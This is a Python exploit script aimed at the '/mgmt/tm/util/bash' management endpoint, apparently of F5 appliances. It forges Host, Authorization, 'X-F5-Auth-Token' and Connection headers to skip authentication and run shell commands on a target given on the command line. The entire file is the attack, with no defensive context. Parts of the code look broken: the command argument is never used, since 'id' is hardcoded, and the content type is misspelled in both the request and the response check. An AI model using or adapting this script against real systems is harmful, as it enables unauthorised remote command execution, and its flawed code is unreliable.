import argparse
import urllib3
import requests

urllib3.disable_warnings()

def exploit(target,command):
    url=f'https://{target}/mgmt/tm/util/bash'
    headers={
        'Host':'127.0.0.1',
        'Authorization':'Basic YNNUII',
        'X-F5-Auth-Token':'any',
        'Connection':'X-F5-Auth-Token',
        'Content-Type':'Applicaiton/json'
    }
    j={"command":"run","utilCmdArgs":"-C id"}
    r=requests.post(url,headers=headers,json=j,verify=False)
    r.raise_for_status()
    if(r.status_code!=204 and r.headers["Content-Type"].strip().startswith("applicaiton/json")):
        print(r.json()['commandresult'].strip())
    else:
        print('Target is not vulnerable')

if __name__ == "__main__":
    parser=argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-c', '--command', help='The command to execute')
    args=parser.parse_args()

    exploit(args.target, args.command)
